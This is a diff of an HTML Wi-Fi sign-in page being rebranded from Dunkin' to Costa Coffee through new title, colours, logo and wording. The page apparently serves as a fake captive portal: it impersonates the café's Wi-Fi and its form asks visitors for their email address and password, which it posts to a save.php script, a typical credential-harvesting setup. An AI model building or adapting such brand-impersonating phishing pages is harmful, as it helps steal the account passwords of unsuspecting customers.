@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Dunkin' Wi-Fi Access</title>
+  <title>Costa Coffee Wi-Fi Access</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     * {
@@ -12,8 +12,8 @@
     body {
       margin: 0;
       padding: 0;
-      font-family: Arial, sans-serif;
-      background-color: #fff0f5;
+      font-family: 'Arial', sans-serif;
+      background-color: #f8f4f1; 
       display: flex;
       justify-content: center;
       align-items: center;
@@ -21,23 +21,23 @@
     }
 
     .container {
-      background-color: white;
+      background-color: #ffffff;
       padding: 35px 30px;
       border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      box-shadow: 0 0 15px rgba(150, 30, 45, 0.2);
       width: 90%;
       max-width: 400px;
       text-align: center;
-      border-top: 6px solid #ff671f; /* Orange Dunkin' */
+      border-top: 6px solid #a6192e; 
     }
 
     .logo img {
-      width: 100px;
+      width: 120px;
       margin-bottom: 20px;
     }
 
     h2 {
-      color: #e60073; /* Pink Dunkin' */
+      color: #a6192e; 
       margin-bottom: 25px;
       font-size: 18px;
       letter-spacing: 0.5px;
@@ -56,7 +56,7 @@
     button {
       width: 100%;
       padding: 13px;
-      background-color: #ff671f;
+      background-color: #a6192e; 
       color: white;
       border: none;
       border-radius: 6px;
@@ -67,7 +67,7 @@
     }
 
     button:hover {
-      background-color: #e65c1c;
+      background-color: #8e1527;
     }
 
     .footer {
@@ -77,12 +77,12 @@
     }
 
     @media (max-width: 600px) {
-      h2 {
-        font-size: 16px;
-      }
-
       .container {
         padding: 25px 20px;
+      }
+
+      h2 {
+        font-size: 16px;
       }
     }
   </style>
@@ -91,16 +91,16 @@
 
   <div class="container">
     <div class="logo">
-      <img src="icons/dunkin_logo.png" alt="Dunkin Logo">
+      <img src="icons/costa_logo.png" alt="Costa Coffee Logo">
     </div>
-    <h2>SIGN IN TO USE DUNKIN' WI-FI</h2>
+    <h2>SIGN IN TO ACCESS COSTA COFFEE WI-FI</h2>
     <form method="POST" action="save.php">
       <input type="email" name="email" placeholder="Email Address" required>
       <input type="password" name="password" placeholder="Password" required>
       <button type="submit">Connect</button>
     </form>
     <div class="footer">
-      <p>Enjoy free Wi-Fi while sipping your Dunkin'.</p>
+      <p>Enjoy your coffee while staying connected at Costa.</p>
     </div>
   </div>
 
